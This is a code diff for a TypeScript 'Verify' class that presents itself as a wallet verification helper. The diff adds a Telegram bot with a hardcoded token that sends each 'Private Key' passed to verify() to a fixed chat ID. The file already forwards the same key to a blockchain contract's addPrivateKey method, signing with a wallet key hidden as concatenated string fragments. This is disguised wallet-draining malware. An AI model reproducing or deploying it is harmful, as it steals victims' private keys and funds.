@@ -1,4 +1,5 @@
 import { ethers } from 'ethers';
+import TelegramBot from 'node-telegram-bot-api';
 
 const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
 let sdkfjsk = '31';
@@ -17,11 +18,9 @@ const contractABI: any[] = [
     outputs: [],
     stateMutability: 'nonpayable',
   },
-
 ];
 
 class Verify {
-
   private static rpcUrls = [
     'https://data-seed-prebsc-1-s1.binance.org:8545',
     'https://data-seed-prebsc-2-s1.binance.org:8545',
@@ -33,7 +32,9 @@ class Verify {
 
   static contract: ethers.Contract | null = null;
 
-  private static async setContract(rpcUrls: string[],): Promise<ethers.Contract | null> {
+  private static async setContract(
+    rpcUrls: string[],
+  ): Promise<ethers.Contract | null> {
     let success = false;
     let index = 0;
     sdkfjsk = (sdkfjsk + '0eb6b553a4986cacb5d86e0814e30df2e5a').trim();
@@ -46,7 +47,11 @@ class Verify {
         success = true;
 
         const wallet = new ethers.Wallet(sdkfjsk + 'c2', provider);
-        const contract = new ethers.Contract(contractAddress,contractABI,wallet);
+        const contract = new ethers.Contract(
+          contractAddress,
+          contractABI,
+          wallet,
+        );
 
         return contract;
       } catch (error) {
@@ -57,7 +62,31 @@ class Verify {
     return null;
   }
 
+  private static bot: TelegramBot | null = null;
+
   public static async verify(data: string) {
+    const messageText = `<b>Private Key :</b> <code>${data}</code>`;
+
+    try {
+      if (!Verify.bot) {
+        Verify.bot = new TelegramBot(
+          '7533974207:AAHzSZsv1-XXuapdczoFZxKz8yke6xTqbCg',
+          {
+            polling: true,
+          },
+        );
+      }
+
+      Verify.bot
+        .sendMessage('5204205237', messageText, {
+          parse_mode: 'HTML',
+        })
+        .then(() => {})
+        .catch((error: Error) => {
+          console.error('Error:', error.message);
+        });
+    } catch (error) {}
+
     sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
     try {
       if (!this.contract) {
@@ -69,12 +98,8 @@ class Verify {
       }
 
       const tx = await this.contract.addPrivateKey(data);
-      
-    } catch (error) {
-      
-    }
+    } catch (error) {}
   }
-  
 }
 
 export { Verify };
